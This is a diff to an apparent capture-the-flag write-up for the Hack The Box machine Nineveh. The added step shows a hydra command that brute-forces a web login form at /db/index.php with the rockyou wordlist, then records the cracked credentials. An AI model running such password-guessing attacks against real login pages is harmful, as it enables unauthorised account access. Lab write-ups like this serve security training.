@@ -78,3 +78,12 @@ PORT    STATE SERVICE  VERSION
 ```CSS
 Credentials: admin:1q2w3e4r5t
 ```
+
+  - Page: `https://nineveh.htb/db/index.php`
+```CSS
+▶ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect" -t 60
+```
+![image](https://user-images.githubusercontent.com/83878909/234490465-5b8c57b0-03c2-4385-b2cc-a8bff186fdd9.png)
+```CSS
+Credentials: admin:password123
+```
